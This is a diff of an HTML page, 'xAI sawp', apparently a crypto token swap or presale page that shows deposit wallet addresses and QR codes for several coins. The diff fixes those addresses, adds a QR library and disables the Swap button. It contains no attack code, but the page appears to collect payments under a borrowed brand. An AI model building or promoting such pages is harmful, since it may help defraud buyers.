@@ -6,6 +6,8 @@
     <title>xAI sawp</title>
     <link rel="stylesheet" href="style.css">
     <link rel="shortcut icon" href="./assets/Xai-coin.png" type="image/x-icon">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
 
 </head>
 <body>
@@ -29,22 +31,22 @@
                             </div>
                             <div class="cryptoSelect_warp">
                                 <select id="cryptoSelect" onchange="convertToXAi()">
-                                    <option value="100769.23 " data-addresses='["bc1qkczz4xsv6ekxg98gn2yux80vq5vjb9hpljc4dn",
-                                     "bc1qkczz4xsv6ekxg98gn2yux10vq5vjb9hpljc4dn"]' 
+                                    <option value="100769.23 " data-addresses='["bc1qkczz4xsv6ekxg98gn2yux80vq5vjz9hpljc4dn",
+                                     "bc1qkczz4xsv6ekxg98gn2yux80vq5vjz9hpljc4dn"]' 
                                     data-images='["./assets/BTC.png", "./assets/qr.svg"]'>BTC</option>
-                                    <option value="899.2537313432836" data-addresses='["bc1qkczz4xsv6ekxg98gn2yux80vq5vjb9hpljc4dn",
-                                     "bc1qkczz4xsv6ekxg98gn2yux10vq5vjb9hpljc4dn"]' 
+                                    <option value="899.2537313432836" data-addresses='["0x36BC988712E7c953AE0026861077fAD10D983367",
+                                     "0x36BC988712E7c953AE0026861077fAD10D983367"]' 
                                     data-images='["./assets/bnb.png", "./assets/qr.svg"]'>BNB</option>
-                                    <option value="1.5" data-addresses='["0x36BC988712E7c953RR0026861077fAD10D983367", 
-                                    "0x36BC988712E7c953RR0026861077fAD10D981234"]'
+                                    <option value="1.5" data-addresses='["0x36BC988712E7c953AE0026861077fAD10D983367", 
+                                    "0x36BC988712E7c953AE0026861077fAD10D983367"]'
                                      data-images='["./assets/USDT.png", "./assets/qr.svg"]'>USDT</option>
-                                    <option value="0.631786771964462" data-addresses='["addr1qyvt86707ghkcu7va4vcw5seq7ag7GGGGnmezrmuqlfnpv6rckglamcqwangqzqxhql8mdjquc455cutck46lha5a0wsufhayp", "addr1qyvt86707ghkcu7va4vcw5seq7ag7PPPPnmezrmuqlfnpv6rckglamcqwangqzqxhql8mdjquc455cutck46lha5a0wsufhayp"]'
+                                    <option value="0.631786771964462" data-addresses='["addr1qyvt86707ghkcu7va4vcw5seq7ag7a2ppnmezrmuqlfnpv6rckglamcqwangqzqxhql8mdjquc455cutck46lha5a0wsufhayp", "addr1qyvt86707ghkcu7va4vcw5seq7ag7a2ppnmezrmuqlfnpv6rckglamcqwangqzqxhql8mdjquc455cutck46lha5a0wsufhayp"]'
                                      data-images='["./assets/ADA.webp", "./assets/qr.svg"]'>ADA</option>
-                                    <option value="5239" data-addresses='["0x36BC988712E7c953AE0026862988fAD10D983367", "0x36BC988712E7c399AE0026861077fAD10D983367"]'
+                                    <option value="5239" data-addresses='["0x36BC988712E7c953AE0026861077fAD10D983367", "0x36BC988712E7c953AE0026861077fAD10D983367"]'
                                      data-images='["./assets/ETH.png", "./assets/qr.svg"]'>ETH</option>
-                                    <option value="0.7180616740088106" data-addresses='["rB4yuf13AHf5Y451dUGp6useMWFw81ddww", "rB4yuf13AHf5Y451dUGp6useMFHF81ddkE"]' 
+                                    <option value="0.7180616740088106" data-addresses='["rB4yuf13AHf5Y451dUGp6useMWFw81ddkE", "rB4yuf13AHf5Y451dUGp6useMWFw81ddkE"]' 
                                     data-images='["./assets/xrp.png", "./assets/qr.svg"]'>XRP</option>
-                                    <option value="1.499844623990056" data-addresses='["D5d2Kk8E3tup7nLq62eeJLtkAQjmAaPPPP", "D5d2Kk8E3tup7nLq62eeJjlkAQjmAaHspR"]' 
+                                    <option value="1.499844623990056" data-addresses='["D5d2Kk8E3tup7nLq62eeJLtkAQjmAaHspR", "D5d2Kk8E3tup7nLq62eeJLtkAQjmAaHspR"]' 
                                     data-images='["./assets/Doge.png", "./assets/qr.svg"]'>DOGE</option>
                                 </select>
                             </div>
@@ -83,7 +85,8 @@
                         </div>
                         <!-- <a class="swap-button" href="./sawpid.html" id="swapButton" >Swap</a>
                         <a href="./sawpid.html" id="viewDetailsLink" onclick="prepareDetails()">View Details</a> -->
-                        <a class="swap-button" href="./sawpid.html" id="swapButton" onclick="prepareDetails()">Swap</a>
+                        <!-- <a class="swap-button" href="./sawpid.html" id="swapButton" onclick="prepareDetails()">Swap</a> -->
+                        <a class="swap-button disabled" href="./sawpid.html" id="swapButton" onclick="prepareDetails()">Swap</a>
                       </div>
 
 
@@ -217,5 +220,7 @@
     <script>
         // document.addEventListener('contextmenu', event => event.preventDefault());
       </script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
 </body>
 </html>
